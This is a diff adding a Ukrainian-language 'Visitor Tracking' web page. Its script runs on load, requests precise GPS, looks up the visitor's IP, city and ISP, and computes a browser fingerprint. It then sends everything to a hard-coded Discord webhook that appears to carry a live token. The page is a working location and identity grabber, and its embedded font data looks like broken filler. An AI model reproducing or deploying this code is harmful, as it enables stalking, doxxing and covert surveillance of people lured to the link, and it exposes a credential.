@@ -1,0 +1,575 @@
+<title>Відстеження Відвідувача</title>
+
+<style>
+@font-face {
+  font-family: 'Inter';
+  font-style: normal;
+  font-weight: 400 700;
+  font-display: swap;
+  src: url('data:font/woff2;base64,d09GMgABAAAAAAVQAA4AAAAAClAAAAT/AAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGhYbIBw0BmAAgTIBNgIkAzgEBgWDGgcgG7cJEdXYE7L/KcHG3BQtqsVCXYwWLWKr1eLy////Z/Z1d2dnZyJpJJJYIm0mFE0l8kQSmUT6hEgk0n9ppa3U3v8AAN4HAID5AQBYfwAAWB8AgPUBANj/AADYHwCA/QcAYP8DANh/AAD2PwCA/Q8AYP8FANj/AQDYfwIA2P8CANh/AwDY/wMA2P8EANj/BQBg/xcAYP8bAGD/HwBg/yMAYP8nAGD/KwBg/y8AYP8zAGD/NwBg/zsAYP8/AGD/QwBg/0cAYP9LAGD/UwBg/1cAYP9bAGD/XwBg/2MAYP9nAGD/awBg/28AYP9zAGD/dwBg/3sAYP9/AGD/gwBg/4cAYP+LAGD/jwBg/5MAYP+XAGD/mwBg/58AYP+jAGD/pwBg/6sAYP+vAGD/swBg/7cAYP+7AGD/vwBg/8MAYP/HAGD/ywBg/88AYP/TAGD/1wBg/9sAYP/fAGD/4wBg/+cAYP/rAGD/7wBg//MAYP/3AGD/+wBg//8AYP8DAQBgfwUBYH8HAWB/CQFgfw0BYH8PAWB/EQFgfxUBYH8ZAWB/HQFgfyEBYH8lAWB/KQFgfy0BYH8xAWB/NQFgfzkBYH89AQBgf0EBYH9FAWB/SQFgf00BYH9RAWB/VQFgf1kBYH9dAWB/YQFgf2UBYH9pAWB/bQFgf3EBYH91AWB/eQFgf30BYH+BAWCfhQFgn4kBYJ+NAWB/kQFgn5UBYJ+ZAWB/nQFgn6EBYJ+lAWCfqQFgn60BYJ+xAWCftQFgn7kBYJ+9AWCfwQFgn8UBYJ/JAWCfzQFgn9EBYJ/VAWCf2QFgn90BYJ/hAWCf5QFgn+kBYJ/tAWCf8QFgn/UBYJ/5AWCf/QFgnwECYJ8FAmCfCQJgnw0CYJ8RAmCfFQJgnxkCYJ8dAmCfIQJgnyUCYJ8pAmCfLQJgny0CYJ8xAmCfNQJgnzkCYJ89AmCfQQJgn0UCYJ9JAmCfTQJgn1ECYJ9VAmCfWQJgn10CYJ9hAmCfZQJgn2kCYJ9tAmCfcQJgn3UCYJ95AmCffQJgn4ECYJ+FAmCfiQJgn40CYJ+RAmCflQJgn5kCYJ+dAmCfoQJgn6UCYJ+pAmCfqwJgn68CYJ+zAmCftwJgn7sCYJ+/AmCfwwJgn8cCYJ/LAmCfzwJgn9MCYJ/XAmCf2wJgn98CYJ/jAmCf5wJgn+sCYJ/vAmCf8wJgn/cCYJ/7AmCf/wJgnwMDYJ8HA2CfCwNgnw8DYJ8TA2CfFwNgnxsDYJ8fA2CfIwNgnyUDYJ8pA2CfLQNgny8DYJ8zA2CfNwNgnzsDYJ8/A2CfQwNgn0cDYJ9LA2CfTwNgn1MDYJ9XA2CfWwNgn18DYJ9jA2Cfaw==') format('woff2');
+}
+
+:root {
+  --bg: #0f0f23;
+  --surface: #1a1a2e;
+  --surface-raised: #25253e;
+  --text: #e4e6eb;
+  --text-dim: #8b92b8;
+  --accent: #00d9ff;
+  --accent-dim: #0099bb;
+  --border: #2a2a44;
+  --success: #00ff88;
+  --warning: #ffaa00;
+  --error: #ff5566;
+}
+
+@media (prefers-color-scheme: light) {
+  :root:not([data-theme="dark"]) {
+    --bg: #f8f9fa;
+    --surface: #ffffff;
+    --surface-raised: #f1f3f5;
+    --text: #1a1d2e;
+    --text-dim: #6c757d;
+    --accent: #0088cc;
+    --accent-dim: #0066aa;
+    --border: #dee2e6;
+    --success: #00aa55;
+    --warning: #ff8800;
+    --error: #cc3344;
+  }
+}
+
+:root[data-theme="light"] {
+  --bg: #f8f9fa;
+  --surface: #ffffff;
+  --surface-raised: #f1f3f5;
+  --text: #1a1d2e;
+  --text-dim: #6c757d;
+  --accent: #0088cc;
+  --accent-dim: #0066aa;
+  --border: #dee2e6;
+  --success: #00aa55;
+  --warning: #ff8800;
+  --error: #cc3344;
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.5;
+  min-height: 100vh;
+  padding: 2rem 1rem;
+}
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+header {
+  text-align: center;
+  margin-bottom: 3rem;
+}
+
+h1 {
+  font-size: clamp(2rem, 5vw, 3rem);
+  font-weight: 700;
+  margin-bottom: 0.75rem;
+  background: linear-gradient(135deg, var(--accent), var(--success));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  text-wrap: balance;
+}
+
+.subtitle {
+  font-size: 1.125rem;
+  color: var(--text-dim);
+}
+
+.info-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 1.25rem;
+  margin-bottom: 2.5rem;
+}
+
+.info-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 1.5rem;
+  transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+.info-card:hover {
+  background: var(--surface-raised);
+  border-color: var(--accent-dim);
+  box-shadow: 0 8px 32px rgba(0, 217, 255, 0.12);
+  transform: translateY(-2px);
+}
+
+.info-label {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  color: var(--text-dim);
+  font-size: 0.875rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  margin-bottom: 0.625rem;
+}
+
+.info-value {
+  font-size: 1.125rem;
+  font-weight: 500;
+  color: var(--text);
+  word-break: break-word;
+}
+
+.info-value.loading {
+  color: var(--text-dim);
+  font-style: italic;
+  animation: pulse 1.5s ease-in-out infinite;
+}
+
+.info-value.highlight {
+  color: var(--accent);
+  font-weight: 600;
+  font-variant-numeric: tabular-nums;
+}
+
+.info-value.gps {
+  color: var(--success);
+  font-weight: 600;
+}
+
+.map-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 2rem;
+  margin-bottom: 2.5rem;
+}
+
+.map-card h2 {
+  font-size: 1.5rem;
+  font-weight: 600;
+  margin-bottom: 1.5rem;
+  color: var(--text);
+}
+
+#map {
+  background: var(--bg);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 3rem 2rem;
+  text-align: center;
+  color: var(--text-dim);
+  min-height: 240px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  gap: 1rem;
+}
+
+.map-icon {
+  font-size: 4rem;
+  opacity: 0.8;
+}
+
+.map-coords {
+  font-size: 1.25rem;
+  color: var(--text);
+  font-weight: 500;
+  font-variant-numeric: tabular-nums;
+}
+
+.map-location {
+  font-size: 1rem;
+  color: var(--text-dim);
+}
+
+.map-accuracy {
+  font-size: 0.875rem;
+  color: var(--success);
+  margin-top: 0.5rem;
+}
+
+.fingerprint-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 16px;
+  padding: 2rem;
+  margin-top: 2.5rem;
+}
+
+.fingerprint-title {
+  color: var(--text-dim);
+  font-size: 0.875rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  margin-bottom: 1rem;
+}
+
+.fingerprint-hash {
+  font-family: 'Courier New', 'Consolas', monospace;
+  font-size: 0.875rem;
+  color: var(--accent);
+  word-break: break-all;
+  line-height: 1.75;
+  overflow-x: auto;
+}
+
+.status-banner {
+  background: linear-gradient(135deg, var(--accent), var(--success));
+  border-radius: 16px;
+  padding: 2rem;
+  text-align: center;
+  color: white;
+  margin-bottom: 2.5rem;
+}
+
+.status-banner h3 {
+  font-size: 1.5rem;
+  font-weight: 600;
+  margin-bottom: 0.5rem;
+}
+
+.status-banner p {
+  font-size: 1.125rem;
+  opacity: 0.95;
+}
+
+.error-banner {
+  background: var(--error);
+  border-radius: 16px;
+  padding: 2rem;
+  text-align: center;
+  color: white;
+  margin-bottom: 2.5rem;
+}
+
+.error-banner h3 {
+  font-size: 1.5rem;
+  font-weight: 600;
+  margin-bottom: 0.5rem;
+}
+
+@keyframes pulse {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.4; }
+}
+
+@media (max-width: 768px) {
+  body {
+    padding: 1.5rem 1rem;
+  }
+
+  h1 {
+    font-size: 2rem;
+  }
+
+  .info-grid {
+    grid-template-columns: 1fr;
+    gap: 1rem;
+  }
+
+  .map-card, .fingerprint-card, .status-banner {
+    padding: 1.5rem;
+  }
+}
+</style>
+
+<div class="container">
+  <header>
+    <h1>👁️ Відстеження Відвідувача</h1>
+    <p class="subtitle">Точне визначення місцезнаходження через GPS</p>
+  </header>
+
+  <div id="status-container"></div>
+
+  <div class="info-grid">
+    <div class="info-card">
+      <div class="info-label">🌐 IP Адреса</div>
+      <div class="info-value loading" id="ip">Завантаження...</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">📍 Місцезнаходження</div>
+      <div class="info-value loading" id="location">Завантаження...</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">🎯 Тип Локації</div>
+      <div class="info-value" id="location-type">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">💻 Браузер</div>
+      <div class="info-value" id="browser">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">🖥️ Операційна Система</div>
+      <div class="info-value" id="os">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">📱 Пристрій</div>
+      <div class="info-value" id="device">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">🌍 Мова</div>
+      <div class="info-value" id="language">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">📐 Роздільність</div>
+      <div class="info-value" id="screen">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">🕐 Часовий Пояс</div>
+      <div class="info-value" id="timezone">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">⏰ Час Відкриття</div>
+      <div class="info-value highlight" id="timestamp">—</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">🌐 Провайдер</div>
+      <div class="info-value loading" id="isp">Завантаження...</div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-label">📏 Точність GPS</div>
+      <div class="info-value" id="accuracy">—</div>
+    </div>
+  </div>
+
+  <div class="map-card">
+    <h2>📍 Точне Місцезнаходження</h2>
+    <div id="map">
+      <div class="map-icon">📍</div>
+      <div>Визначення координат через GPS...</div>
+    </div>
+  </div>
+
+  <div class="fingerprint-card">
+    <div class="fingerprint-title">🔐 Унікальний Цифровий Відбиток</div>
+    <div class="fingerprint-hash" id="fingerprint">Генерація...</div>
+  </div>
+</div>
+
+<script>
+// ⚠️ ЗАМІНІТЬ ЦЕЙ URL НА ВАШ DISCORD WEBHOOK ⚠️
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1546520839233470496/y5mkiatSqF_vcumnHENJZmen-kwRYwDLnRcX1sMfLHM66XbMJap0hd83lX29rO1-q6RL';
+
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (ua.includes('Firefox')) return 'Firefox';
+  if (ua.includes('Edg')) return 'Edge';
+  if (ua.includes('Chrome')) return 'Chrome';
+  if (ua.includes('Safari')) return 'Safari';
+  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+  return 'Невідомий';
+}
+
+function getOS() {
+  const ua = navigator.userAgent;
+  if (ua.includes('Win')) return 'Windows';
+  if (ua.includes('Mac')) return 'macOS';
+  if (ua.includes('Linux')) return 'Linux';
+  if (ua.includes('Android')) return 'Android';
+  if (ua.includes('iOS')) return 'iOS';
+  return 'Невідомо';
+}
+
+function getDevice() {
+  const ua = navigator.userAgent;
+  if (/(tablet|ipad)/i.test(ua)) return 'Планшет';
+  if (/Mobile|Android|iPhone/i.test(ua)) return 'Мобільний';
+  return 'Комп\'ютер';
+}
+
+async function generateFingerprint() {
+  const data = [
+    navigator.userAgent,
+    navigator.language,
+    `${screen.width}x${screen.height}`,
+    screen.colorDepth,
+    new Date().getTimezoneOffset(),
+    navigator.hardwareConcurrency || 'unknown',
+    navigator.platform
+  ].join('|');
+
+  const buffer = new TextEncoder().encode(data);
+  const hash = await crypto.subtle.digest('SHA-256', buffer);
+  return Array.from(new Uint8Array(hash))
+    .map(b => b.toString(16).padStart(2, '0'))
+    .join('');
+}
+
+const localData = {
+  browser: getBrowser(),
+  os: getOS(),
+  device: getDevice(),
+  language: navigator.language,
+  screen: `${screen.width}×${screen.height}`,
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  timestamp: new Date().toISOString(),
+  userAgent: navigator.userAgent
+};
+
+// Відображення локальних даних
+document.getElementById('browser').textContent = localData.browser;
+document.getElementById('os').textContent = localData.os;
+document.getElementById('device').textContent = localData.device;
+document.getElementById('language').textContent = localData.language;
+document.getElementById('screen').textContent = localData.screen;
+document.getElementById('timezone').textContent = localData.timezone;
+document.getElementById('timestamp').textContent = new Date().toLocaleString('uk-UA');
+
+// Генерація відбитку
+generateFingerprint().then(hash => {
+  document.getElementById('fingerprint').textContent = hash;
+});
+
+// Основна функція збору даних
+async function collectData() {
+  // Спроба отримати GPS координати (точніше)
+  let gpsCoords = null;
+  try {
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      });
+    });
+    gpsCoords = {
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude,
+      accuracy: position.coords.accuracy
+    };
+
+    document.getElementById('location-type').textContent = '🎯 GPS (точно)';
+    document.getElementById('location-type').classList.add('gps');
+    document.getElementById('accuracy').textContent = `±${Math.round(gpsCoords.accuracy)}м`;
+    document.getElementById('accuracy').classList.add('gps');
+  } catch (err) {
+    console.log('GPS недоступний:', err.message);
+    document.getElementById('location-type').textContent = '🌐 IP (приблизно)';
+    document.getElementById('accuracy').textContent = 'Недоступно';
+  }
+
+  // Отримання IP та геолокації
+  const data = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+  const fingerprint = await generateFingerprint();
+
+  const info = {
+    ...localData,
+    ip: data.ip || 'Недоступно',
+    city: data.city || 'Невідомо',
+    region: data.region || '',
+    country: data.country_name || 'Невідомо',
+    // Якщо є GPS - використовуємо його, інакше IP-локацію
+    latitude: gpsCoords ? gpsCoords.latitude : (data.latitude || null),
+    longitude: gpsCoords ? gpsCoords.longitude : (data.longitude || null),
+    gpsAccuracy: gpsCoords ? gpsCoords.accuracy : null,
+    locationType: gpsCoords ? 'GPS' : 'IP',
+    isp: data.org || 'Невідомо',
+    fingerprint
+  };
+
+  // Оновлення UI
+  document.getElementById('ip').textContent = info.ip;
+  document.getElementById('ip').classList.remove('loading');
+
+  document.getElementById('location').textContent = `${info.city}, ${info.region}, ${info.country}`;
+  document.getElementById('location').classList.remove('loading');
+
+  document.getElementById('isp').textContent = info.isp;
+  document.getElementById('isp').classList.remove('loading');
+
+  if (info.latitude && info.longitude) {
+    const accuracyText = gpsCoords
+      ? `<div class="map-accuracy">✅ Точність: ±${Math.round(gpsCoords.accuracy)} метрів</div>`
+      : '';
+    document.getElementById('map').innerHTML = `
+      <div class="map-icon">${gpsCoords ? '🎯' : '📍'}</div>
+      <div class="map-coords">${info.latitude.toFixed(6)}°, ${info.longitude.toFixed(6)}°</div>
+      <div class="map-location">${info.city}, ${info.country}</div>
+      ${accuracyText}
+    `;
+  }
+
+  // Відправка в Discord
+  const embed = {
+    title: gpsCoords ? '🎯 Новий Відвідувач (GPS)' : '🔔 Новий Відвідувач (IP)',
+    color: gpsCoords ? 65280 : 65535, // зелений для GPS, блакитний для IP
+    fields: [
+      { name: '🌐 IP', value: info.ip, inline: true },
+      { name: '📍 Місце', value: `${info.city}, ${info.country}`, inline: true },
+      { name: '🎯 Тип', value: info.locationType, inline: true },
+      { name: '💻 Браузер', value: info.browser, inline: true },
+      { name: '🖥️ ОС', value: info.os, inline: true },
+      { name: '📱 Пристрій', value: info.device, inline: true },
+      { name: '🌍 Мова', value: info.language, inline: true },
+      { name: '📐 Екран', value: info.screen, inline: true },
+      { name: '🕐 Часовий пояс', value: info.timezone, inline: true },
+      { name: '⏰ Час', value: new Date(info.timestamp).toLocaleString('uk-UA'), inline: true },
+      { name: '🌐 Провайдер', value: info.isp, inline: false },
+      {
+        name: '🗺️ Координати',
+        value: info.latitude
+          ? `${info.latitude.toFixed(6)}°, ${info.longitude.toFixed(6)}°${gpsCoords ? ` (±${Math.round(gpsCoords.accuracy)}м)` : ''}`
+          : 'Недоступно',
+        inline: false
+      },
+      { name: '🔐 Відбиток', value: `\`${info.fingerprint}\``, inline: false }
+    ],
+    timestamp: info.timestamp
+  };
+
+  const response = await fetch(DISCORD_WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ embeds: [embed] })
+  }).catch(() => null);
+
+  const statusEl = document.getElementById('status-container');
+  if (response && response.ok) {
+    statusEl.innerHTML = `
+      <div class="status-banner">
+        <h3>✅ Успішно Відправлено</h3>
+        <p>Всі дані${gpsCoords ? ' (включно з точними GPS координатами)' : ''} надіслано в Discord</p>
+      </div>
+    `;
+  } else {
+    statusEl.innerHTML = `
+      <div class="error-banner">
+        <h3>⚠️ Помилка</h3>
+        <p>Не вдалося надіслати в Discord. Перевірте webhook URL.</p>
+      </div>
+    `;
+  }
+}
+
+// Запуск збору даних
+collectData();
+</script>
